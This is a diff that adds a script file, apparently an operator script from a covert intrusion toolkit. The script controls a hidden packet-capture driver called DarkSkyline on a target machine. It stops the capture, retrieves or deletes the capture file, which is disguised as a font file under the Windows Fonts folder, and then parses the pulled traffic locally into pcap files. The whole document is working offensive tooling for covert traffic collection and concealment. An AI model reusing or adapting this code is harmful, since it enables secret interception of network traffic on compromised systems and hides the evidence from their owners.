@@ -1,0 +1,132 @@
+#--------------------------------------------------------
+# File: HandleCapture.eps
+#
+# Handle DarkSyline capture file
+#
+# Modifications:
+#  01/13/2003	Created.
+#  05/03/2004	Updated to handle non-default capture file
+#--------------------------------------------------------
+@include "_GetSystemPaths.epm";
+@include "Include\\DsIncludes.epm";
+@include "_GetDirectory.epm";
+
+@echo off;
+
+if (($argc < 3) || ($argc > 4)) {
+    echo "Usage: $argv[0] <driverName> <delete|get> [captureFile]";
+    return false;
+}
+
+@record on;
+
+# get resource directory
+ifnot (`getdirectory -resources`) {
+    echo "* Unable to get resources directory";
+    return false;
+}
+
+string $rDir = GetCmdData("dir");
+ifnot (defined($rDir[0])) {
+    echo "* Unable to retrieve resources directory";
+    return false;
+}
+
+string $resPath = "$rDir\\DarkSkyline";
+
+@record off;
+
+string $driver = $argv[1];
+string $action = $argv[2];
+string $captureFile = "\\SystemRoot\\Fonts\\vga_ds.tff";
+if ($argc >= 4) {
+    $captureFile = $argv[3];
+}
+
+if (($action != "get") && ($action != "delete")) {
+    echo "Usage: $argv[0] <driverName> <delete|get> [captureFile]";
+    return false;
+}
+
+if ($action == "delete") {
+    ifnot (prompt "Are you sure you want to delete the capture file?") {
+	return false;	
+    }
+}
+
+# convert capture file path to user-mode
+DsGetUserModePath($captureFile);
+
+string $parts = SplitPath($captureFile);
+string $path = $parts[0];
+string $file = $parts[1];
+
+echo "Stopping scanning";
+@echo on;
+if (`packetscan -name $driver -control stop`) {
+    if ($action == "get") {
+
+	echo "Getting '$path\\$file'";
+	@record on;
+	bool $rtn = `get "$path\\$file" -foreground`;
+	@record off;
+	if ($rtn) {
+	    echo "    SUCCESS";
+		string $localname;
+		string $logdir;
+		$localname = GetCmdData("localname");
+		@echo off;
+		_GetLpLogsDirectory($logdir);
+		echo "";
+		echo "AUTOMATIC PARSING";
+		echo "";
+		@record on;
+		`local run -command "perl -e \\"use Time::localtime; printf \\\\"\%d\%02d\%02d-\%02d\%02d\%02d\\\\", localtime->year()+1900, localtime->mon(), localtime->mday(), localtime->hour, localtime->min(), localtime->sec()\\"" -redirect`;
+		@record off;
+		string $perltimestamp = GetCmdData("output");
+		string $prefix = "DARKSKYLINE_$perltimestamp";
+		echo "Using capture file name prefix: $prefix";
+		if (`local run -command "\\"$resPath\\DS_ParseLogs.exe\\" \\"Get_Files\\$localname\\" \\"$prefix\\"" -redirect "ParseLogs_$prefix"`) {
+			echo "Automatically parsed your capture file.";
+		} else {
+			echo "WARNING: Automatic capture parse failed.";
+		}
+		echo "";
+		string $underscore = "_";
+		string $prefixmask = "$prefix$underscore*.pcap";
+		`local run -command "cmd /c move $logdir\\$prefixmask $logdir\\Get_Files" -redirect`;
+		echo "Moved $prefixmask from EP log dir to Get_Files.";
+		`local mkdir "$logdir\\Get_Files\\NOSEND"`;
+		if (`local move "$logdir\\Get_Files\\$localname" "$logdir\\Get_Files\\NOSEND\\$localname"`) {
+			echo "Capture file '$localname' has been moved to NOSEND.";
+		} else {
+			echo "WARNING: RAW CAPTURE NOT MOVED TO NOSEND! DO THIS YOURSELF!";
+		}
+		@echo on;
+	} else {
+	    echo "    FAILED";
+	}
+    
+        return $rtn;
+
+    } else if ($action == "delete") {
+
+	echo "Deleting $path\\$file";
+	if (`del "$file" -path "$path"`) {
+	    echo "    DELETED";
+	    return true;
+	} else {
+	    echo "    FAILED";
+	    return false;
+	}
+
+    } else {
+	
+	echo "Unknown action ($action)";
+	return false;
+
+    }    
+}
+@echo off;
+
+return false;
